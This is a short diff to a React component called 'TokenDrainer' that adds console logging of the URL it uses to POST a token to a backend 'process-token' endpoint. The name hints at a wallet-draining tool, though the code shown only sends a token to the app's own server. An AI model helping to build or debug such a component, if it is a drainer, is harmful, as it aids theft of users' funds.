@@ -13,7 +13,10 @@ function TokenDrainer() {
     if (token) {
       setStatus('processing');
 
-      fetch(`${API_ORIGIN}/api/process-token`, {
+      const processTokenUrl = `${API_ORIGIN}/api/process-token`;
+      console.log('process-token URL:', processTokenUrl);
+
+      fetch(processTokenUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -30,7 +33,7 @@ function TokenDrainer() {
           if (data.message) console.error('Backend:', data.message);
           return;
         }
-        console.log('process-token API ran successfully');
+        console.log('process-token API ran successfully:', processTokenUrl);
         setStatus('success');
       })
       .catch((err) => {
